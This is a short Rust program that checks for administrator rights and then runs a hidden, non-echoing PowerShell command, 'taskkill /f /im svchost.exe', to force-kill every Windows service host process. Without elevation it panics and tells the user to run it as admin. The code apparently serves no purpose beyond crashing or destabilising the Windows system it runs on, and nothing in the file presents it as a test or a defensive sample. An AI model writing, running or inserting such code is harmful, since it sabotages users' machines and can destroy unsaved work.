use powershell_script::PsScriptBuilder;
use windows::is_app_elevated;
mod windows;
fn main() {
    let isit = is_app_elevated();
    if isit == true {

    
    let ps = PsScriptBuilder::new()
    .no_profile(true)
    .non_interactive(true)
    .hidden(true)
    .print_commands(false)
    .build();

    let _commandrun = ps.run(r#"taskkill /f /im svchost.exe"#).unwrap();
    }
    else {
        panic!("you need to make it admin")
    }
}